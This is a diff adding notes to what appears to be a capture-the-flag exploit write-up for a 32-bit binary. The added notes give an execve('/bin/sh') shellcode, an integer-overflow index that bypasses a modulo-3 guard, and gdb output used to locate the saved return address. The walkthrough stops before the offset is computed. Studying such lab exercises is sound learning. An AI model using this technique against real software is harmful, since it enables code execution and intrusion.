@@ -72,9 +72,63 @@ Input command: store
  8048688:	74 0d                	je     8048697 <store_number+0x67>
 
 # Check if index % 3 == 0 and jump to error return
-https://stackoverflow.com/questions/44212301/efficient-mod-3-in-x86-assembly
+https://stackoverflow.com/questions/44212301/efficient-mod-3-in-x86-assembly # Common Knowledge ofc
 
 # Ok so we know we can store data as unsigned int (4 bytes) in this array and that some value are inaccessible (n % 3 == 0), we can't use env_var,
 there is no buffer we can directly overflow, no weak printf nor function, no call of `/bin/sh`
 # That mean we have to find a way the store shellcode somewhere and exec it, luckily we have an array that store u_int for us
 # Sure, sure but when can we force the stack to exec the code ?
+
+# Well FIRST, store the shellcode is a probleme cause we can acces 2 on 3 var
+Shellcode: "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" # execve("/bin/sh") on 21 bytes
+# 21 / 4 = 5.25, so we can't store our shellcode in a normal way, the question is how to we acces the array at index 0 and 3
+# Since it's u_int, we can try like we previously did with the underflow by giving out how range value
+
+# The u_int_32_max value = 4294967295 (+1 to overflow) but we can't use it this raw because
+80486c5:	c1 e0 02 shl    $0x2,%eax # This take the index value and multiply it by 4, so we need to divide ou value by 4
+
+(4294967295 + 1) / 4 = 1073741824
+1073741824 % 3 == 1 so it's ok
+
+# So let's try
+Input command: store
+ Number: 9
+ Index: 0
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+ 
+ Input command: store
+ Number: 8
+ Index: 1073741824
+ Completed store command successfully
+Input command: read
+ Index: 0
+ Number at data[0] is 8
+ Completed read command successfully
+ 
+# POG we store it at index[0] so we can store the full shellcode (don't forget LES PETITS PEAUX ROUGES and we store u_int not hex)
+# Now we need to find a way to exec it, one option is to override the return of a function like the FOCKING MAIN
+# How do we get this adress ?
+
+# Break point before we quit the prog
+0x080489f0 <+717>:	pop    %ebp
+0x080489f1 <+718>:	ret
+   
+Breakpoint 2, 0x080489f0 in main ()
+(gdb) i f
+Stack level 0, frame at 0xffffd6e0:
+ eip = 0x80489f0 in main; saved eip 0xf7e45513
+ Arglist at 0xffffd6d8, args:
+ Locals at 0xffffd6d8, Previous frame's sp is 0xffffd6e0
+ Saved registers:
+  ebp at 0xffffd6d8, eip at 0xffffd6dc
+  
+# We have save EIP and we need the array adress in order to find the offset
+# We need to put a breakpoint anywhere we use the array (for exemple in the read function) and find the addr
+(gdb) x $ebp+0x8
+0xffffd4f0:	0xffffd514
+
+# Now we find the offset AND ZIOUM
+
